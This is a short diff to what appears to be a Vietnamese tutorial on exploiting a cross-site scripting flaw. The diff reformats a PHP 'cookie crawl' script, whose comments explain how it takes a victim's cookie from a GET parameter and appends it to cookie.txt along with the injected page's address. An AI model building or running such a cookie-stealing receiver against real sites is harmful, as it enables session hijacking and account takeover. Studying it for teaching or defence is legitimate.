@@ -23,13 +23,11 @@ Vậy là đã chắc chắn web vulnerable với XSS, ta sẽ tiến hành khai
 
 Code php crawl cookie:
 >
-><?php
 >
->    if(isset($_GET['cookie']))
->
->    {
->
->        $cookie = $_GET['cookie'];
+<?php
+    if(isset($_GET['cookie']))
+    {
+        $cookie = $_GET['cookie'];
         // Mở file cookie.txt, tham số a nghĩa là file này mở chỉ để write chứ không scan hay read
         $f=fopen('cookie.txt','a');
         // Ta write địa chỉ trang web mà ở trang đó bị ta chèn script.
